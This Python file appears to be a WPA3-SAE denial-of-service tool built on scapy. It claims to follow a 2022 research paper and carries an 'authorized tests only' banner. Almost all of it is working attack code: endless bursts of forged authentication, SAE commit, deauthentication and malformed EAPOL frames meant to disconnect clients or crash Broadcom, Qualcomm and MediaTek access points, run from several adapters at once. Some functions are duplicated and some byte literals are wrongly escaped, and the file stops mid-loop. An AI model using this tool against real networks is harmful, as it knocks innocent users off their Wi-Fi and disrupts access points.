#!/usr/bin/env python3
"""
================================================================================
orchestator_master_en.py - COMPLETE SCIENTIFIC EDITION (LIST-BASED + CONTINUOUS)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)
FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
FEATURES:
1. List-based SAE parameters with random rotation (anti-fingerprinting)
2. Continuous attack loops (while True) for sustained stress testing
3. Two-phase Radio Confusion per Paper Section 6.6 + PMF per Section 5
4. ALL 20+ attacks from the paper included and functional
5. Scientific burst timing + rate limiting for reproducible experiments
================================================================================
"""
import subprocess
import time
import os
import sys
import glob
import random
from multiprocessing import Process, Value
from scapy.all import (
    RadioTap, Dot11, Dot11Auth, Dot11Deauth, EAPOL,
    sendp, RandMAC, Raw
)

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================
# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"      # Replace with actual 5 GHz BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"    # Replace with actual 2.4 GHz BSSID

# --- 2. SAE PARAMETERS (LIST-BASED, EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: Replace placeholders with at least 20 valid pairs per band!
SAE_SCALAR_2_4_HEX_LIST = [
    'b600c5f488079fe458aab69e04837002e993caaa8b65d60da3660ccd31babfd8',
    # ... add 19 more valid 2.4GHz scalars here ...
]
SAE_FINITE_2_4_HEX_LIST = [
    '060a86f9c543153583e74c380a00a150f3c731ac6d17126c7e5f5299d31ddc0c5c4aade74138d113e3c8c5ec3395bfbcf7247c155a26acc8e817257b5d025b18',
    # ... add 19 more valid 2.4GHz finites here ...
]
SAE_SCALAR_5_HEX_LIST = [
    '11362c5aae0a1e775420100e5b3dae049c4ec0eb933149708ff05dc67e04d13c',
    # ... add 19 more valid 5GHz scalars here ...
]
SAE_FINITE_5_HEX_LIST = [
    '03da8f5a7e810a0243cf087b5906654c6689278db667ceac6ab9e6aba49bdfcbb46cbc4211e0338bc0414f9a5a1a11687e2b04f57c7db36694e0554e3f121a82',
    # ... add 19 more valid 5GHz finites here ...
]

# --- 3. SCANNER / MANUAL CHANNELS ---
SCANNER_INTERFACE = ""
MANUELLER_KANAL_5GHZ = "104"
MANUELLER_KANAL_2_4GHZ = "6"


# --- 4. TARGET CLIENTS (MANUAL ASSIGNMENT) ---

# Clients for GENERAL attacks (deauth_flood, pmf_deauth_exploit, malformed...)
TARGET_STA_MACS = [
#    "AA:BB:CC:DD:EE:11",         
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP A: TARGET IS 5 GHz (The 5 GHz band should crash)
# These attacks require MAC addresses of clients currently on 5 GHz.
# - case6_radio_confusion (Standard)
# - case13_radio_confusion_mediatek_reverse (Reverse)
TARGET_STA_MACS_5GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",       
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP B: TARGET IS 2.4 GHz (The 2.4 GHz band should crash)
# These attacks require MAC addresses of clients currently on 2.4 GHz.
# - case6_radio_confusion_reverse (Reverse)
# - case13_radio_confusion_mediatek (Standard)
TARGET_STA_MACS_2_4GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",         
#    "AA:BB:CC:DD:EE:11",     
#    "AA:BB:CC:DD:EE:11"
]
# ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
# "pmf_deauth_exploit": Exploits the PMF protection mechanism against the client. 
# Phase 1: Preparation (The main attack)
#
#    You start one of your DoS attacks (e.g., back_to_the_future, open_auth, or amplification).
#
#    Goal: The CPU and/or memory of the router are so heavily loaded that it reacts very slowly or not at all to new requests. The router is now "weakened".
#
# Phase 2: The Trigger (The Exploit)
#
#    Your pmf_deauth_exploit process sends a single, unprotected deauthentication frame. It spoofs the router's MAC address.
#
# "malformed_msg1_length", "malformed_msg1_flags": Attacks the client driver via the 4-Way Handshake.
#
# --- Category: Generic WPA3-SAE Attacks (from Section 4 of the study) ---
#
# "bad_algo": Sends authentication frames with an invalid algorithm value.
# "bad_seq": Sends SAE frames with an invalid sequence number.
# "bad_status_code": Sends SAE confirm frames with an invalid status code.
# "empty_frame_confirm": Sends empty SAE confirm frames.
#
# --- Category: Vendor Specific Attacks (from Section 6 of the study) ---
#
# "case1_denial_of_internet": Disconnects a client from the internet by deleting its session on the AP. Broadcom.
# "case2_bad_auth_algo_broadcom": Uses invalid algorithm values to disrupt Broadcom APs. Broadcom.
# "case3_bad_status_code": Sends SAE confirm frames with an invalid status code. Broadcom.
# "case4_bad_send_confirm": Manipulates the "Send-Confirm" counter in SAE confirm frames. Broadcom.
# "case5_empty_frame": Sends empty SAE confirm frames. Broadcom.
# "case6_radio_confusion": Confuses dual-band drivers. Purpose: Crashes the 5 GHz band. Broadcom.
# "case6_radio_confusion_reverse": Inverse logic of Case 6. Purpose: Crashes the 2.4 GHz band. Broadcom.
# "case7_back_to_the_future": Overloads WPA2 APs with WPA3 packets. Broadcom.
# "case8_bad_auth_algo_qualcomm": Like Case II, but tailored to Qualcomm chipsets. Qualcomm.
# "case9_bad_sequence_number": Uses invalid sequence numbers in authentication frames. Qualcomm.
# "case10a_bad_auth_body_empty": Sends authentication frames with an empty body. Qualcomm.
# "case10b_bad_auth_body_payload": Sends authentication frames with a faulty payload. Qualcomm.
# "case11_seq_status_fuzz": Performs a fuzzing attack with varying sequence and status codes. Qualcomm.
# "case12_bursty_auth": Sends authentication frames in bursts to force MediaTek APs to reboot. MediaTek.
# "case13_radio_confusion_mediatek": Confuses MediaTek drivers. Purpose: Crashes the 2.4 GHz band.
# "case13_radio_confusion_mediatek_reverse": Inverse logic of Case 13. Purpose: Crashes the 5 GHz band.
#
###############################################################################################################################################
# ==============================================================================
# HOW TO CHOOSE THE RIGHT ATTACK IN ADAPTER_KONFIGURATION
# ==============================================================================
#
# GOAL: Crash the 5 GHz Band
# - Use "case6_radio_confusion" on 2.4GHz adapters
# - Use "case13_radio_confusion_mediatek_reverse" on 2.4GHz adapters
# (Needs MACs in TARGET_STA_MACS_5GHZ_SPECIAL) ✅
#
# GOAL: Crash the 2.4 GHz Band
# - Use "case6_radio_confusion_reverse" on 5GHz adapters
# - Use "case13_radio_confusion_mediatek" on 5GHz adapters
# (Needs MACs in TARGET_STA_MACS_2_4GHZ_SPECIAL) ✅
# --- 5. ADAPTER & ATTACK CONFIGURATION ---
ADAPTER_KONFIGURATION = {
    # Crash 2.4GHz: adapters on 5GHz, attack is reverse
    "wlan0mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
    # Crash 5GHz: adapters on 2.4GHz, attack is standard
    "wlan1mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},
    "wlan2mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
}

# --- 6. SCIENTIFIC PARAMETERS ---
PACKETS_PER_SECOND_LIMIT = 1000
BURST_SIZE_OPTIMAL = 64
INTER_PACKET_GAP = 0.0001
EXPERIMENT_DURATION = 3600

# =====================================================================================
# ======================== HELPER FUNCTIONS ===========================================
# =====================================================================================
def set_channel_scientific(interface: str, channel: str) -> bool:
    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],
                ['iwconfig', interface, 'channel', str(channel)]]:
        try:
            if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
                time.sleep(0.1)
                return True
        except: pass
    return False

def send_burst_scientific(packet_list: list, interface: str, counter: Value):
    if not packet_list: return
    start = time.time()
    sent = 0
    batch_size = min(len(packet_list), BURST_SIZE_OPTIMAL)
    try:
        for i in range(0, len(packet_list), batch_size):
            batch = packet_list[i:i+batch_size]
            sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
            sent += len(batch)
            elapsed = time.time() - start
            if elapsed < sent / PACKETS_PER_SECOND_LIMIT:
                time.sleep(sent/PACKETS_PER_SECOND_LIMIT - elapsed)
            with counter.get_lock():
                counter.value += len(batch)
    except OSError:
        time.sleep(0.1)

def create_sae_payload_bytes(scalar: bytes, finite: bytes) -> bytes:
    return b'\x13\x00' + scalar[:32] + finite[:64]

def get_random_sae_bytes(scalar_list, finite_list):
    """Safely pick a valid hex string from list and convert to bytes"""
    valid_s = [x for x in scalar_list if "INSERT" not in x and len(x) == 64]
    valid_f = [x for x in finite_list if "INSERT" not in x and len(x) == 128]
    if not valid_s or not valid_f: return None, None
    s_hex, f_hex = random.choice(valid_s), random.choice(valid_f)
    return bytes.fromhex(s_hex), bytes.fromhex(f_hex)

def cleanup(procs):
    for p in procs.values():
        if p and p.is_alive():
            p.terminate(); p.join(timeout=1)
            if p.is_alive(): p.kill()

MAC_POOL = [str(RandMAC()) for _ in range(5000)]

def get_fast_randmac():
    return random.choice(MAC_POOL)
# =====================================================================================
# ======================== ATTACK FUNCTIONS (LIST-HANDLING FIXED) =====================
# =====================================================================================
def run_case1_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
    if not s: return
    payload = Raw(create_sae_payload_bytes(s, f))
    print(f"[CASE1] {iface}: Denial of Internet...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            burst = [RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
            send_burst_scientific(burst * 50, iface, cnt)
            time.sleep(5)
    except KeyboardInterrupt: pass

def run_case2_process(iface, cnt, **kw):
    b, ch = kw['bssid'], kw['channel']
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE2] {iface}: Bad Algo Broadcom...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=5,seqnum=1,status=0) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_case3_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE3] {iface}: Bad Status Code...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            # 2 Bytes Prefix + 96 Bytes Zufall = 98 Bytes
            PAYLOAD = Raw(b'\\x00\\x00' + os.urandom(96))
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=3,seqnum=2,status=77)/PAYLOAD for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case4_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE4] {iface}: Bad Send-Confirm...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            # 2 Bytes Prefix + 96 Bytes Zufall = 98 Bytes
            PAYLOAD = Raw(b'\\x11\\x11' + os.urandom(96))
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0)/PAYLOAD for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case4_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE4] {iface}: Bad Send-Confirm...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            PAYLOAD = Raw(b'\x11\x11' + os.urandom(32))
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0)/PAYLOAD for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case5_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    print(f"[CASE5] {iface}: Empty Frame...")
    if not set_channel_scientific(iface, ch): return
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0) for c in cls]*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case6_radio_confusion_process(iface, cnt, **kw):
    ch_24, ch_5, tgt = kw['channel_2_4ghz'], kw['channel_5ghz'], kw['bssid_5ghz']
    cls = kw.get('clients', [])
    if not (ch_24 and ch_5 and tgt and cls): return
    print(f"[CASE6] {iface}: TWO-PHASE Radio Confusion (Crash 5GHz)...")
    try:
        if set_channel_scientific(iface, ch_24):
            for _ in range(300):
                s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                if not s: continue
                payload = Raw(create_sae_payload_bytes(s, f))
                burst = [RadioTap()/Dot11(addr1=tgt,addr2=c,addr3=tgt)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
                if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                time.sleep(0.1)
        if set_channel_scientific(iface, ch_5):
            for _ in range(200):
                s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                if not s: continue
                payload = Raw(create_sae_payload_bytes(s, f))
                burst = [RadioTap()/Dot11(addr1=tgt,addr2=c,addr3=tgt)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
                if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                time.sleep(0.1)
    except KeyboardInterrupt: pass

def run_case6_reverse_process(iface, cnt, **kw):
    ch_24, ch_5, tgt = kw['channel_2_4ghz'], kw['channel_5ghz'], kw['bssid_2_4ghz']
    cls = kw.get('clients', [])
    if not (ch_24 and ch_5 and tgt and cls): return
    print(f"[CASE6-REV] {iface}: TWO-PHASE Reverse + PMF (Crash 2.4GHz)...")
    try:
        if set_channel_scientific(iface, ch_5):
            for _ in range(300):
                s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                if not s: continue
                payload = Raw(create_sae_payload_bytes(s, f))
                burst = [RadioTap()/Dot11(addr1=tgt,addr2=c,addr3=tgt)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
                if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                time.sleep(0.1)
        if set_channel_scientific(iface, ch_24):
            p2_start = time.time()
            for _ in range(200):
                s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
                if not s: continue
                payload = Raw(create_sae_payload_bytes(s, f))
                burst = [RadioTap()/Dot11(addr1=tgt,addr2=c,addr3=tgt)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
                if burst: send_burst_scientific(burst*(128//len(burst)+1), iface, cnt)
                time.sleep(0.1)
                if time.time()-p2_start > 40: break
        time.sleep(10)
        for rnd in range(2):
            deauth = [RadioTap()/Dot11(addr1=c,addr2=tgt,addr3=tgt)/Dot11Deauth(reason=3) for c in cls]
            send_burst_scientific(deauth*60, iface, cnt)
            time.sleep(1.0)
    except KeyboardInterrupt: pass

def run_case7_process(iface, cnt, **kw):
    b, ch = kw['bssid'], kw['channel']
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE7] {iface}: Back to the Future...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst = [RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for _ in range(128)]
            send_burst_scientific(burst, iface, cnt)
    except KeyboardInterrupt: pass

def run_case8_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE8] {iface}: Bad Auth Algo Qualcomm...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=random.choice([0]+list(range(7,100))),seqnum=1,status=0) for c in cls]*20, iface, cnt)
    except KeyboardInterrupt: pass

def run_case9_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE9] {iface}: Bad Sequence Number...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst = [RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=random.choice([0,3]),seqnum=3,status=0)/payload for c in cls]
            send_burst_scientific(burst*20, iface, cnt)
    except KeyboardInterrupt: pass

def run_case10a_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE10A] {iface}: Bad Auth Body Empty...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=random.randint(1,65535)) for c in cls]*50, iface, cnt)
    except KeyboardInterrupt: pass

def run_case10b_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    BAD = Raw(bytes.fromhex('1300b8263a4b72b42638691b47d442785f92ab519b3eff598563c3a3e1914446990b05afd3996a922b6ede4f5f063ecbbe83ee10e9778f8d118b6eed76b97b8d29d7d4d2275704c1a2ff018234deef54e6806ee083b04c27028dcebf71df73e79296'))
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE10B] {iface}: Bad Auth Body Payload...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=random.randint(1,65535))/BAD for c in cls]*50, iface, cnt)
    except KeyboardInterrupt: pass

def run_case11_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    c0 = cls[0]
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE11] {iface}: Seq/Status Fuzzing...")
    try:
        while True:
            for seq in range(2):
                st = 0
                burst = []
                for i in range(1000):
                    if i%100==0: st = (st%11)+1
                    burst.append(RadioTap()/Dot11(addr1=b,addr2=c0,addr3=b)/Dot11Auth(algo=0,seqnum=seq,status=st))
                    if len(burst)>=128: send_burst_scientific(burst, iface, cnt); burst=[]
                if burst: send_burst_scientific(burst, iface, cnt)
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case12_process(iface, cnt, **kw):
    b, ch, cls = kw['bssid'], kw['channel'], kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[CASE12] {iface}: Bursty Auth MediaTek...")
    try:
        while True:
            burst = []
            for c in cls:
                for a in range(1,5): burst.append(RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Auth(algo=a,seqnum=1,status=0))
            send_burst_scientific(burst*25, iface, cnt)
    except KeyboardInterrupt: pass

def run_case13_process(iface, cnt, **kw):
    ch_send, tgt, cls = kw.get('channel_5ghz'), kw.get('bssid_2_4ghz'), kw.get('clients',[])
    if not (ch_send and tgt and cls): return
    if not set_channel_scientific(iface, ch_send): return
    print(f"[CASE13] {iface}: MediaTek Cross-Band...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst = [RadioTap()/Dot11(addr1=tgt,addr2=c,addr3=tgt)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
            if burst: send_burst_scientific(burst*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_case13_reverse_process(iface, cnt, **kw):
    ch_send, tgt, cls = kw.get('channel_2_4ghz'), kw.get('bssid_5ghz'), kw.get('clients',[])
    if not (ch_send and tgt and cls): return
    if not set_channel_scientific(iface, ch_send): return
    print(f"[CASE13-REV] {iface}: MediaTek Cross-Band Rev...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst = [RadioTap()/Dot11(addr1=tgt,addr2=c,addr3=tgt)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for c in cls]
            if burst: send_burst_scientific(burst*64, iface, cnt)
    except KeyboardInterrupt: pass

def run_deauth_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[DEAUTH] {iface}: Deauth Flood...")
    try:
        while True:
            burst = []
            for c in cls:
                burst.extend([RadioTap()/Dot11(addr1=c,addr2=b,addr3=b)/Dot11Deauth(reason=7),
                              RadioTap()/Dot11(addr1=b,addr2=c,addr3=b)/Dot11Deauth(reason=7)])
            send_burst_scientific(burst*32, iface, cnt)
    except KeyboardInterrupt: pass

def run_pmf_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    if not set_channel_scientific(iface, ch): return
    print(f"[PMF] {iface}: PMF Deauth Exploit...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=c,addr2=b,addr3=b)/Dot11Deauth(reason=3) for c in cls]*50, iface, cnt)
    except KeyboardInterrupt: pass

def run_malformed_process(iface, cnt, **kw):
    b, ch, cls = kw.get('bssid'), kw.get('channel'), kw.get('clients',[])
    if not cls: return
    payload = Raw(b'\x02\x03\x00\x5f\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' + (b'\x00' * 80))
    if not set_channel_scientific(iface, ch): return
    print(f"[MALFORMED] {iface}: Malformed MSG1...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(type=2,subtype=8,addr1=c,addr2=b,addr3=b)/EAPOL(version=1,type=3)/payload for c in cls]*10, iface, cnt)
    except KeyboardInterrupt: pass

def run_bad_algo_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[BAD_ALGO] {iface}: Bad Algo Generic...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=random.choice([0,1,2,4,5])) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_bad_seq_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[BAD_SEQ] {iface}: Bad Seq Generic...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst = [RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=random.choice([0,3,4]),status=0)/payload for _ in range(128)]
            send_burst_scientific(burst, iface, cnt)
    except KeyboardInterrupt: pass

def run_bad_status_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[BAD_STATUS] {iface}: Bad Status Generic...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=random.randint(108,200)) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_empty_confirm_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[EMPTY_CONFIRM] {iface}: Empty Confirm Generic...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_cookie_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[COOKIE] {iface}: Cookie Guzzler...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst = [RadioTap()/Dot11(type=0,subtype=11,addr1=b,addr2=str(RandMAC()),addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for _ in range(128)]
            send_burst_scientific(burst, iface, cnt)
    except KeyboardInterrupt: pass

# =====================================================================================
# ======================== MAIN ORCHESTRATOR ==========================================
# =====================================================================================
def validate_configuration():
    def valid_b(b): return b and b!="AA:BB:CC:DD:EE:11" and len(b.split(':'))==6
    def has_valid_scalar(lst): return any("INSERT" not in s and len(s) == 64 for s in lst)
    
    def has_valid_finite(lst): return any("INSERT" not in s and len(s) == 128 for s in lst)
    
    errs = []
    if not valid_b(TARGET_BSSID_5GHZ): errs.append("Invalid 5GHz BSSID")
    if not valid_b(TARGET_BSSID_2_4GHZ): errs.append("Invalid 2.4GHz BSSID")
    if not has_valid_scalar(SAE_SCALAR_2_4_HEX_LIST): errs.append("Invalid 2.4GHz Scalar List")
    if not has_valid_finite(SAE_FINITE_2_4_HEX_LIST): errs.append("Invalid 2.4GHz Finite List")
    if not has_valid_scalar(SAE_SCALAR_5_HEX_LIST): errs.append("Invalid 5GHz Scalar List")
    if not has_valid_finite(SAE_FINITE_5_HEX_LIST): errs.append("Invalid 5GHz Finite List")
    
    if errs:
        print("\\n[CRITICAL ERRORS]:\\n" + "\\n".join(f"  ✗ {e}" for e in errs))
        return False
    print("\\n[VALIDATION] Configuration valid")
    return True

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] Run with sudo!")
    print("\n" + "="*80 + "\nWPA3-SAE DoS Orchestrator - FINAL CORRECTED EDITION\n" + "="*80)
    if not validate_configuration(): sys.exit(1)
    cleanup({})
    
    ap_targets = {'5ghz':{'bssid':TARGET_BSSID_5GHZ,'channel':MANUELLER_KANAL_5GHZ},
                  '2.4ghz':{'bssid':TARGET_BSSID_2_4GHZ,'channel':MANUELLER_KANAL_2_4GHZ}}
    
    ATTACKS = {
        "case1_denial_of_internet": run_case1_process, "case2_bad_auth_algo_broadcom": run_case2_process,
        "case3_bad_status_code": run_case3_process, "case4_bad_send_confirm": run_case4_process,
        "case5_empty_frame": run_case5_process, "case6_radio_confusion": run_case6_radio_confusion_process,
        "case6_radio_confusion_reverse": run_case6_reverse_process, "case7_back_to_the_future": run_case7_process,
        "case8_bad_auth_algo_qualcomm": run_case8_process, "case9_bad_sequence_number": run_case9_process,
        "case10a_bad_auth_body_empty": run_case10a_process, "case10b_bad_auth_body_payload": run_case10b_process,
        "case11_seq_status_fuzz": run_case11_process, "case12_bursty_auth": run_case12_process,
        "case13_radio_confusion_mediatek": run_case13_process, "case13_radio_confusion_mediatek_reverse": run_case13_reverse_process,
        "deauth_flood": run_deauth_process, "pmf_deauth_exploit": run_pmf_process,
        "malformed_msg1": run_malformed_process, "bad_algo": run_bad_algo_process,
        "bad_seq": run_bad_seq_process, "bad_status_code": run_bad_status_process,
        "empty_frame_confirm": run_empty_confirm_process, "cookie_guzzler": run_cookie_process
    }
    
    procs, counters = {}, {i:Value('i',0) for i in ADAPTER_KONFIGURATION}
    for iface, cfg in ADAPTER_KONFIGURATION.items():
        attack, band = cfg['angriff'], cfg.get('band','5GHz')
        if attack not in ATTACKS: continue
        ap = ap_targets.get('5ghz' if band=='5GHz' else '2.4ghz')
        if not ap: continue
        
        # List selection logic
        if attack in ["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
            s_list, f_list = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
        elif attack in ["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
            s_list, f_list = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
        else:
            s_list = SAE_SCALAR_5_HEX_LIST if band=='5GHz' else SAE_SCALAR_2_4_HEX_LIST
            f_list = SAE_FINITE_5_HEX_LIST if band=='5GHz' else SAE_FINITE_2_4_HEX_LIST
            
        kw = {'bssid':ap['bssid'],'channel':ap['channel'],
              'scalar_hex_list':s_list,'finite_hex_list':f_list,'clients':[]}
        kw['bssid_5ghz'], kw['channel_5ghz'] = ap_targets['5ghz']['bssid'], ap_targets['5ghz']['channel']
        kw['bssid_2_4ghz'], kw['channel_2_4ghz'] = ap_targets['2.4ghz']['bssid'], ap_targets['2.4ghz']['channel']
        
        if attack in ["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
            kw['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
        elif attack in ["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
            kw['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
        elif attack not in ["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
            kw['clients'] = TARGET_STA_MACS
            
        if not kw['clients'] and attack not in ["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
            print(f"[WARN] {iface}: No clients available"); continue
            
        print(f"[START] {iface} ({band}): {attack} | Clients:{len(kw['clients'])}")
        p = Process(target=ATTACKS[attack], args=(iface,counters[iface]), kwargs=kw)
        p.start(); procs[iface]=p
        
    if not procs: sys.exit("\n[ERROR] No processes started.")
    print(f"\n[INFO] {len(procs)} processes started. Press Ctrl+C to stop.\n")
    
    try:
        start = time.time()
        while any(p.is_alive() for p in procs.values()):
